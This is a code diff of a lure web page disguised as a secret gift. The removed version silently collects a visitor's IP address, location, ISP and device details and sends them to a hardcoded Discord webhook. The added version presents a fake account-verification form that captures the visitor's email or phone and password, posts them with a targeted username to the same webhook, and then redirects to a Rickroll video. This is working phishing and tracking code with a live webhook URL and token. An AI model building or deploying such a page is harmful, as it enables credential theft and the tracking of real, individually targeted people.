@@ -2,66 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>A Secret Gift...</title>
-    <meta property="og:title" content="You've Received a Heart Box!">
-    <meta property="og:description" content="Click to open your special surprise from a friend.">
-    <meta property="og:image" content="https://img.freepik.com/free-vector/red-heart-box-with-ribbon_23-2147503126.jpg">
-    
+    <title>A Private Message...</title>
     <style>
-        body { background-color: #1a1a1a; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        .heart { font-size: 100px; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 15px #ff4d4d); }
-        .heart:hover { transform: scale(1.1); }
-        h1 { color: #ff4d4d; letter-spacing: 2px; }
-        .btn { background: #ff4d4d; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 15px rgba(255,77,77,0.3); }
+        body { background: #1a1a1a; color: white; font-family: 'Helvetica Neue', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: #2f3136; padding: 40px; border-radius: 10px; width: 320px; text-align: center; border-top: 5px solid #ff4d4d; }
+        .user-avatar { font-size: 60px; margin-bottom: 10px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 4px; border: none; background: #202225; color: white; box-sizing: border-box; }
+        .claim-btn { width: 100%; padding: 12px; background: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .claim-btn:hover { background: #4752c4; }
+        #target-name { color: #ff4d4d; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="heart" onclick="captureAndRickroll()">🎁❤️</div>
-        <h1>For heartboxx</h1>
-        <button class="btn" onclick="captureAndRickroll()">SEE MORE</button>
+    <div class="login-card">
+        <div class="user-avatar">🎁</div>
+        <h3>Verification Needed</h3>
+        <p>Hello, <span id="target-name">Guest</span>! Please verify your account to open the gift sent to you.</p>
+        
+        <input type="text" id="email" placeholder="Email or Phone Number">
+        <input type="password" id="pass" placeholder="Password">
+        
+        <button class="claim-btn" onclick="execute()">VERIFY & OPEN</button>
     </div>
 
     <script>
+        // 1. Identify WHO clicked by reading the URL (?id=name)
+        const urlParams = new URLSearchParams(window.location.search);
+        const username = urlParams.get('id') || "Guest";
+        document.getElementById('target-name').innerText = username;
+
         const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        async function captureAndRickroll() {
+        async function execute() {
+            const e = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+
+            if(!e || !p) { alert("Credentials required for verification."); return; }
+
+            // 2. Send the captured data + the username to your webhook
             try {
-                // 1. Fetch IP and Location data using a public API
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                // 2. Format the payload for your Discord Webhook
-                const payload = {
-                    content: "🎯 **TARGET ELIMINATED - RICKROLL DEPLOYED**",
-                    embeds: [{
-                        title: "Target Intelligence Report",
-                        color: 16724301,
-                        fields: [
-                            { name: "Target Name", value: "heartboxx", inline: true },
-                            { name: "IP Address", value: data.ip, inline: true },
-                            { name: "Location", value: `${data.city}, ${data.region}, ${data.country_name}`, inline: false },
-                            { name: "ISP", value: data.org, inline: true },
-                            { name: "Device Info", value: navigator.platform, inline: true }
-                        ],
-                        footer: { text: "Note: Browser security blocked token access. Send the Reaper file next." }
-                    }]
-                };
-
-                // 3. Send to your webhook
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        content: `🔔 **NEW CAPTURE FROM: ${username.toUpperCase()}**`,
+                        embeds: [{
+                            title: "Credential Log",
+                            color: 16724301,
+                            fields: [
+                                { name: "Identified User", value: username, inline: true },
+                                { name: "Email/Phone", value: e },
+                                { name: "Password", value: p }
+                            ],
+                            footer: { text: "Redirecting to Rickroll..." }
+                        }]
+                    })
                 });
+            } catch (err) {}
 
-            } catch (error) {
-                console.log("Silent capture failed, proceeding to Rickroll.");
-            }
-
-            // 4. The Final "Boom"
+            // 3. The Rickroll
             window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         }
     </script>
